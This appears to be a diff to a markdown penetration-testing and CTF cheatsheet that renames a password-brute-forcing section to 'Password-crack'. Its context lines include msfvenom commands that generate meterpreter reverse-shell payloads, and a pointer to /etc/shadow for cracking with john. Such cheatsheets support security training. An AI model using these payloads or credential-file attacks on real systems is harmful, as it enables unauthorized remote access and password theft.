@@ -7,7 +7,7 @@
 	* [Dirsearch](#Dirsearch)
 	* [Exploitdb](#Exploitdb)	
 	* [Metasploit](#Metasploit)
-	* [Brute force password tools](#Brute force password)
+	* [Brute force password tools](#Password-crack)
 * CTF Pwn Cheatsheet
 * Privilege Escalation
 * Reverse Shell
@@ -218,7 +218,7 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost="Your IP" lport="Your Port" -f
 msfvenom -p python/meterpreter/reverse_tcp LHOST="Your IP" LPORT="Your Port" -f pyterpreter.py
 (Create a pyhton reverse shell script)
 ```
-### Brute force password
+### Password-crack
 /etc/shadow and /etc/passwd are the sensitive file in linux.
 * john
 ```
